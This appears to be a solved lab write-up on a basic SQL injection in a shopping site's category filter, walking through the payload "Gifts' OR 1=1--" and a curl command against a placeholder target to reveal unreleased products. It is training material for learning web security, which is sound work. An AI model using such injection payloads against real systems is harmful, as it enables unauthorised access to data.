# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data â€” Apprentice

**Status:** Solved

---

## Goal

Exploit a SQL injection vulnerability in the product category filter to display all products, including unreleased ones.

---

## Steps (simple & complete)

1. **Explore the application**
   - Browse to the shopping application
   - Click on different product categories (Gifts, Lifestyle, etc.)
   - Notice the URL changes:
```
   GET /filter?category=Gifts
```

2. **Understand the backend query**
   - The application likely runs something like:
```sql
   SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
   - It filters by category and only shows released products

3. **Test for SQL injection**
   - Try adding a single quote to break the query:
```
   /filter?category=Gifts'
```
   - If you get an error or strange behavior, it's vulnerable

4. **Craft the SQL injection payload**
   - We need to:
     - Close the category string with `'`
     - Comment out or bypass the `released = 1` check
     - Use `OR 1=1` to show all products
   - Payload:
```
   Gifts' OR 1=1--
```

5. **Execute the injection**
   - URL encode the payload and inject it:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+OR+1=1--"
```
   - Or directly in browser:
```
   /filter?category=Gifts' OR 1=1--
```

6. **How it works**
   - Original query:
```sql
   SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
   - After injection:
```sql
   SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
   - The `--` comments out everything after it
   - `OR 1=1` makes the WHERE clause always true
   - Result: all products are displayed, including unreleased ones

7. **Verify success**
   - You should see more products than before
   - Unreleased products will now be visible
   - Lab automatically solves

---

## Example

- Vulnerable endpoint: `GET /filter?category=Gifts`
- SQL injection payload:
```bash
curl -s "https://TARGET/filter?category=Gifts'+OR+1=1--"
```

---

## Why this works

The application directly inserts user input into the SQL query without any sanitization or parameterized queries. By injecting `OR 1=1--`, we make the WHERE condition always evaluate to true, revealing all data regardless of the intended filters. The double dash (`--`) is a SQL comment that ignores everything after it, effectively removing the `released = 1` restriction.

---

